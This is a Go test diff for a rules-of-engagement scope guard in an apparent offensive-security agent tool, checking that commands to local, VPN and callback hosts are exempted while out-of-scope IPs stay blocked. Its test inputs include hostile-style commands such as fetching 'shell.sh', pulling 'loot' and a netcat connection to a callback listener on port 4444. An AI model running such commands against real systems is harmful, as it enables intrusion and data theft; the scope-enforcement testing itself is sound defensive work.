@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"net"
 	"strings"
 	"testing"
 )
@@ -264,5 +265,54 @@ func TestRoEUsesExtractedShellHintHosts(t *testing.T) {
 	}
 	if !found {
 		t.Fatalf("warn 放行应写 RoE 审计(含抽出的 host), got %+v", warn.Audit())
+	}
+}
+
+func TestRoELocalInterfaceAndCallbackAutoExemption(t *testing.T) {
+	orig := interfaceAddrsFn
+	t.Cleanup(func() { interfaceAddrsFn = orig })
+	interfaceAddrsFn = func() ([]net.Addr, error) {
+		return []net.Addr{
+			&net.IPNet{IP: net.ParseIP("127.0.0.1"), Mask: net.CIDRMask(8, 32)},
+			&net.IPNet{IP: net.ParseIP("10.8.0.5"), Mask: net.CIDRMask(24, 32)},
+			&net.IPNet{IP: net.ParseIP("192.168.111.25"), Mask: net.CIDRMask(24, 32)},
+		}, nil
+	}
+	t.Setenv("ARTEX_CALLBACK_ADDR", "203.0.113.42:4444")
+
+	rules := []ScopeRule{{Kind: "ip", Value: "192.168.111.20"}}
+	strict := roeGuard("strict", rules)
+	for _, cmd := range []string{
+		`curl http://10.8.0.5:8000/shell.sh`,
+		`curl http://192.168.111.25:8080/loot`,
+		`nc 203.0.113.42 4444`,
+	} {
+		if blocked, msg := bashBlocked(t, strict, cmd); blocked {
+			t.Errorf("local/VPN/callback host should be exempted in strict mode (%q): %s", cmd, msg)
+		}
+	}
+	// Non-local out-of-scope IP must still be blocked in strict mode.
+	if blocked, _ := bashBlocked(t, strict, `curl http://10.8.0.99/`); !blocked {
+		t.Error("non-local out-of-scope IP 10.8.0.99 must still be blocked in strict mode")
+	}
+
+	// Warn mode must not spam RoE audit warnings for local NIC / callback IPs.
+	warn := roeGuard("warn", rules)
+	if blocked, _ := bashBlocked(t, warn, `curl http://192.168.111.25:8000/payload`); blocked {
+		t.Fatal("warn mode should allow")
+	}
+	for _, e := range warn.Audit() {
+		if strings.Contains(e.Reason, "RoE") {
+			t.Errorf("local NIC IP should not produce RoE warning audit: %+v", e)
+		}
+	}
+
+	// Explicit exclude_ip must still override local NIC exemption.
+	exclStrict := roeGuard("strict", []ScopeRule{
+		{Kind: "ip", Value: "192.168.111.20"},
+		{Kind: "exclude_ip", Value: "10.8.0.5"},
+	})
+	if blocked, _ := bashBlocked(t, exclStrict, `curl http://10.8.0.5/`); !blocked {
+		t.Error("explicit exclude_ip must override local NIC auto-exemption")
 	}
 }
